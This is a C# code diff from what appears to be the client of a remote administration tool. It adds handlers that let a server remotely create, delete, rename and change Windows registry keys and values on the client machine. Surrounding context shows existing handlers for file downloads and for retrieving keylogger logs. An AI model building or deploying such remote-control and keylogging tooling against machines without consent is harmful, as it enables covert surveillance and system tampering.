@@ -124,6 +124,38 @@ namespace xClient.Core.Packets
                 CommandHandler.HandleDoDownloadFileCancel((ServerPackets.DoDownloadFileCancel)packet,
                     client);
             }
+            else if (type == typeof(ServerPackets.DoLoadRegistryKey))
+            {
+                CommandHandler.HandleGetRegistryKey((ServerPackets.DoLoadRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoCreateRegistryKey))
+            {
+                CommandHandler.HandleCreateRegistryKey((ServerPackets.DoCreateRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoDeleteRegistryKey))
+            {
+                CommandHandler.HandleDeleteRegistryKey((ServerPackets.DoDeleteRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoRenameRegistryKey))
+            {
+                CommandHandler.HandleRenameRegistryKey((ServerPackets.DoRenameRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoCreateRegistryValue))
+            {
+                CommandHandler.HandleCreateRegistryValue((ServerPackets.DoCreateRegistryValue)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoDeleteRegistryValue))
+            {
+                CommandHandler.HandleDeleteRegistryValue((ServerPackets.DoDeleteRegistryValue)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoRenameRegistryValue))
+            {
+                CommandHandler.HandleRenameRegistryValue((ServerPackets.DoRenameRegistryValue)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoChangeRegistryValue))
+            {
+                CommandHandler.HandleChangeRegistryValue((ServerPackets.DoChangeRegistryValue)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
                 CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
